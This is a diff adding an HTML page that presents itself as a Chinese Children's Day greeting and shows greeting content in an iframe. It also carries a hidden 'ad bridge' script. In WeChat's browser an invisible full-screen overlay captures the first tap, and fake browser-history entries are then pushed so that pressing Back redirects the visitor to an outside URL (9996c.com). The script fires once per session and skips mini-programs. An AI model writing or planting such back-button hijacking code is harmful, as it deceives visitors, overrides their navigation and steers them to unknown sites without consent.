@@ -1,0 +1,373 @@
+<html lang="zh-CN"><head>
+    <meta charset="UTF-8">
+    <title>六一儿童节，你要给我买旺仔牛奶吗</title>
+  
+    <script src="https://hm.baidu.com/hm.js?530cca224da9770059b6caf6aa908556"></script><script>
+      var _hmt = _hmt || [];
+      (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?530cca224da9770059b6caf6aa908556";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+    <script>
+      var nowurl = document.location.toString();
+      nowurl = nowurl.replace('https://', '').replace('http://', '').replace(window.location.host, '');
+  
+      var dwidth = '500';
+  
+      function init_viewport() {
+        if (navigator.userAgent.indexOf('Android') !== -1) {
+          var width = window.outerWidth === 0 ? window.screen.width : window.outerWidth;
+          var phoneScale = parseInt(width, 10) / 500;
+          document.write(
+            '<meta name="viewport" content="width=' + dwidth +
+            ' minimum-scale=' + phoneScale +
+            ', maximum-scale=' + phoneScale +
+            ', target-densitydpi=device-dpi">'
+          );
+        } else if (navigator.userAgent.indexOf('iPhone') !== -1) {
+          var phoneScale = parseInt(window.screen.width, 10) / 500;
+          document.write(
+            '<meta name="viewport" content="width=' + dwidth +
+            ', initial-scale=' + phoneScale +
+            ', maximum-scale=' + phoneScale +
+            ', user-scalable=0" />'
+          );
+        } else {
+          document.write(
+            '<meta name="viewport" content="width=' + dwidth +
+            ', initial-scale=0.64" />'
+          );
+        }
+      }
+  
+      init_viewport();
+    </script><meta name="viewport" content="width=500, initial-scale=0.64">
+  
+    <style>
+      html, body {
+        width: 100%;
+        height: 100%;
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+        font-family: sans-serif;
+        background: #fff;
+      }
+  
+      #guardTouchLayer {
+        position: fixed;
+        inset: 0;
+        z-index: 99999;
+        background: rgba(255,255,255,0);
+        cursor: pointer;
+      }
+  
+      iframe {
+        width: 100%;
+        height: 100vh;
+        border: 0;
+        display: block;
+      }
+    </style>
+  </head>
+  
+  <body>
+    <div id="guardTouchLayer"></div>
+  
+    <iframe id="frame" loading="lazy" sandbox="allow-scripts allow-popups allow-same-origin allow-storage-access-by-user-activation" referrerpolicy="no-referrer" src="六一儿童节.html"></iframe>
+  
+    <script>
+      function getId() {
+        try {
+          var params = new URLSearchParams(window.location.search);
+          var id = params.get('id');
+  
+          if (!id) {
+            var m = window.location.pathname.match(/^\/([0-9a-zA-Z_-]+)$/);
+            if (m) id = m[1];
+          }
+  
+          return (id && /^[0-9a-zA-Z_-]+$/.test(id)) ? id : '';
+        } catch (e) {
+          return '';
+        }
+      }
+  
+      var safeId = getId();
+      var iframe = document.getElementById('frame');
+  
+      var iframeUrl = safeId
+        ? ('https://daima.se22.cn/' + safeId)
+        : 'https://daima.se22.cn/';
+  
+      var titleMap = {
+        '2600': '2026新年祝福 - 温馨旅途',
+        '8290': '六一儿童节，你要给我买旺仔牛奶吗'
+      };
+
+      var localChildrenDay = '六一儿童节.html';
+      var useLocalChildrenDay = !safeId || safeId === '8290';
+
+      var finalTitle = titleMap[safeId] || (safeId ? ('专属页面 - ' + safeId) : '六一儿童节，你要给我买旺仔牛奶吗');
+      document.title = finalTitle;
+
+      iframe.src = useLocalChildrenDay ? localChildrenDay : iframeUrl;
+  
+      window.addEventListener('message', function (e) {
+        var trustedOrigins = [
+          'http://daima.se22.cn',
+          'https://daima.se22.cn'
+        ];
+  
+        if (trustedOrigins.indexOf(e.origin) === -1) return;
+      });
+  
+      window.addEventListener('error', function (e) {
+        var ignoreErrors = [
+          "play() failed because the user didn't interact",
+          'sessionStorage',
+          'cross-origin'
+        ];
+  
+        if (ignoreErrors.some(function (msg) {
+          return (e.message || '').indexOf(msg) !== -1;
+        })) {
+          e.preventDefault();
+        }
+      });
+    </script>
+  
+    <script>
+      (function () {
+        if (window.__AD_BRIDGE_INIT__) return;
+        window.__AD_BRIDGE_INIT__ = true;
+  
+        var HOST_WHITELIST = [
+          'k112w.com',
+          'www.k112w.com',
+          'www.enggei.com',
+          'k12w.com',
+          'www.k12w.com'
+        ];
+  
+        var FIXED_JUMP_URL = 'https://9996c.com/8292A';
+  
+        var PAGE_KEY = encodeURIComponent(
+          (window.location.hostname || '') +
+          (window.location.pathname || '/') +
+          (window.location.search || '')
+        );
+  
+        var STORAGE_KEY_ARMED = 'enggei_ad_jump_armed_' + PAGE_KEY;
+        var STORAGE_KEY_USED = 'enggei_ad_jump_used_' + PAGE_KEY;
+  
+        var armed = false;
+        var jumped = false;
+  
+        function getHost() {
+          return (window.location.hostname || '').toLowerCase();
+        }
+  
+        function isAllowedHost() {
+          return HOST_WHITELIST.indexOf(getHost()) !== -1;
+        }
+  
+        function isWeChatBrowser() {
+          return /MicroMessenger/i.test(navigator.userAgent || '');
+        }
+  
+        function isMiniProgramByUA() {
+          return /miniProgram/i.test(navigator.userAgent || '');
+        }
+  
+        function detectMiniProgram(callback) {
+          if (!isWeChatBrowser()) {
+            callback(false);
+            return;
+          }
+  
+          if (
+            typeof wx !== 'undefined' &&
+            wx.miniProgram &&
+            typeof wx.miniProgram.getEnv === 'function'
+          ) {
+            wx.miniProgram.getEnv(function (res) {
+              callback(!!(res && res.miniprogram));
+            });
+            return;
+          }
+  
+          callback(isMiniProgramByUA());
+        }
+  
+        function hasUsed() {
+          try {
+            return sessionStorage.getItem(STORAGE_KEY_USED) === '1';
+          } catch (e) {
+            return false;
+          }
+        }
+  
+        function markUsed() {
+          jumped = true;
+          armed = false;
+  
+          try {
+            sessionStorage.setItem(STORAGE_KEY_USED, '1');
+            sessionStorage.removeItem(STORAGE_KEY_ARMED);
+          } catch (e) {}
+        }
+  
+        function markArmed() {
+          if (hasUsed()) return;
+  
+          armed = true;
+  
+          try {
+            sessionStorage.setItem(STORAGE_KEY_ARMED, '1');
+          } catch (e) {}
+        }
+  
+        function isArmed() {
+          if (hasUsed()) return false;
+          if (armed) return true;
+  
+          try {
+            return sessionStorage.getItem(STORAGE_KEY_ARMED) === '1';
+          } catch (e) {
+            return false;
+          }
+        }
+  
+        function buildBridgeUrl() {
+          var path = window.location.pathname || '/';
+          var search = window.location.search || '';
+          return path + search + '#__ad_bridge__';
+        }
+  
+        function buildContentUrl() {
+          var path = window.location.pathname || '/';
+          var search = window.location.search || '';
+          return path + search;
+        }
+  
+        function installVirtualPreviousPage() {
+          if (!isAllowedHost()) return;
+          if (!isWeChatBrowser()) return;
+          if (hasUsed()) return;
+          if (!isArmed()) return;
+  
+          try {
+            history.pushState({ pageType: 'ad-bridge' }, '', buildBridgeUrl());
+            history.pushState({ pageType: 'content-live' }, '', buildContentUrl());
+          } catch (e) {}
+        }
+  
+        function jumpToAd() {
+          if (jumped) return;
+          if (hasUsed()) return;
+  
+          markUsed();
+  
+          location.href = FIXED_JUMP_URL;
+        }
+  
+        function onBackState(e) {
+          if (!isAllowedHost()) return;
+          if (!isWeChatBrowser()) return;
+          if (hasUsed()) return;
+          if (!isArmed()) return;
+  
+          var state = e.state || {};
+  
+          if (state.pageType === 'ad-bridge') {
+            jumpToAd();
+          }
+        }
+  
+        function armOnce() {
+          if (hasUsed()) return;
+          if (isArmed()) return;
+  
+          markArmed();
+          installVirtualPreviousPage();
+        }
+  
+        function start() {
+          if (!isAllowedHost()) return;
+          if (!isWeChatBrowser()) return;
+          if (hasUsed()) return;
+  
+          detectMiniProgram(function (isMini) {
+            if (isMini) return;
+  
+            window.addEventListener('popstate', onBackState);
+  
+            window.addEventListener('pageshow', function () {
+              if (hasUsed()) return;
+  
+              if (isArmed()) {
+                setTimeout(function () {
+                  installVirtualPreviousPage();
+                }, 0);
+              }
+            });
+  
+            document.addEventListener('visibilitychange', function () {
+              if (hasUsed()) return;
+  
+              if (!document.hidden && isArmed()) {
+                setTimeout(function () {
+                  installVirtualPreviousPage();
+                }, 0);
+              }
+            });
+          });
+        }
+  
+        window.EnggeiAdBridge = {
+          start: start,
+          armOnce: armOnce,
+          jumpToAd: jumpToAd
+        };
+  
+        start();
+      })();
+    </script>
+  
+    <script>
+      (function () {
+        var layer = document.getElementById('guardTouchLayer');
+  
+        function handleFirstTouch() {
+          if (
+            window.EnggeiAdBridge &&
+            typeof window.EnggeiAdBridge.armOnce === 'function'
+          ) {
+            window.EnggeiAdBridge.armOnce();
+          }
+  
+          if (layer) {
+            layer.style.display = 'none';
+          }
+        }
+  
+        if (layer) {
+          layer.addEventListener('click', handleFirstTouch, {
+            passive: true,
+            once: true
+          });
+  
+          layer.addEventListener('touchstart', handleFirstTouch, {
+            passive: true,
+            once: true
+          });
+        }
+      })();
+    </script>
+  
+  </body></html>
